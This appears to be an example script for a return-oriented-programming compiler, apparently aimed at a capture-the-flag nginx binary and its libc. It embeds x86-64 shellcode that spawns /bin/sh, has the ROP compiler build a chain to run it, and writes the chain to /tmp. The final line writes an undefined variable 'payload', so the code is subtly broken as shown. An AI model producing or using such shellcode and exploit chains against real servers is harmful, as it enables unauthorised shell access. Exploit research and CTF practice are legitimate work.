import sys, logging, binascii
from pwn import *
import archinfo
from rop_compiler import ropme, goal

filename = './example/bkp/blah/nginx'

shellcode = ( # http://shell-storm.org/shellcode/files/shellcode-603.php
    "\x48\x31\xd2"                                  # xor    %rdx, %rdx
 +  "\x48\x31\xc0"                                  # xor    %rax, %rax
 +  "\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68"      # mov  $0x68732f6e69622f2f, %rbx
 +  "\x48\xc1\xeb\x08"                              # shr    $0x8, %rbx
 +  "\x53"                                          # push   %rbx
 +  "\x48\x89\xe7"                                  # mov    %rsp, %rdi
 +  "\x50"                                          # push   %rax
 +  "\x57"                                          # push   %rdi
 +  "\x48\x89\xe6"                                  # mov    %rsp, %rsi
 +  "\xb0\x3b"                                      # mov    $0x3b, %al
 +  "\x0f\x05"                                      # syscall
)

files = [(filename, None, 0)]
goal_resolver = goal.create_from_arguments(files, ["./example/bkp/blah/libc.so.6"], [["shellcode_hex", binascii.hexlify(shellcode)]])
rop = ropme.rop(files, goal_resolver, archinfo.ArchAMD64, logging.DEBUG)

with open("/tmp/rop", "w") as f: f.write(rop)
with open("/tmp/payload", "w") as f: f.write(payload)
